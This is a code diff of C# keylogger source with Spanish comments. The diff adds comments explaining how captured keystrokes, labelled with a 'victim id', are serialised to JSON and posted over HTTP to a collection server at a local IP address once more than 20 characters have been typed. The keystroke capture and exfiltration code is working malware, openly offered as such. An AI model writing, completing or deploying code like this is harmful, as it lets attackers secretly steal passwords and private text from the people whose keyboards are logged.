@@ -145,24 +145,33 @@ namespace Keylogger
             texto += buffer;
 
             
-            //si se ingreso mas de 10 caracteres
+            //si se ingreso mas de 20 caracteres
             if (texto.Length > 20)
             {
                 //enviar el texto ingresado a la funcion de guardar texto
                 archivo(texto);
-
+                //Declarar un cliente HTTP
                 HttpClient client = new HttpClient();
+                // declarar un objeto como instancia de la clase log  con el  id de la victima y la cadena de texto de las ultimos  20 eventos de teclado ingresados por la victima
                 var log = new logClass { victima_id = "1", log = texto };
+                //Guardar en un string el objeto instancia de logClass serializado como json
                 string jsonString = JsonConvert.SerializeObject(log);
+                // declarar el objeto json con el encode y el tipo  de dato como json para enviar en las cabeceras
                 var stringContent = new StringContent(jsonString, Encoding.UTF8, "application/json");
+                // declarar el objeto del cliente  http  con la url que ocupara
                 client.BaseAddress = new Uri("http://192.168.0.3:3000/");
+                // guardar la respuesta al ejecutar el envio de datos al  servidor
                 var response = client.PostAsync("api/userLog/postKeylogger", stringContent).Result;
+                //Si el envio fue exitoso
                 if (response.IsSuccessStatusCode)
                 {
+                    //
                     Console.Write("Success");
                 }
+                // Si el envio no fue exitoso
                 else
                 {
+                    //
                     Console.Write("Error");
                 }
 
@@ -213,9 +222,12 @@ namespace Keylogger
 
         }
     }
+    //Clase para  guardar id y  eventos de teclado de la victima
     public class logClass
     {
+        //id de la victima
         public string victima_id { get; set; }
+        //log de los  ultimos eventos de teclado
         public string log { get; set; }
 
       
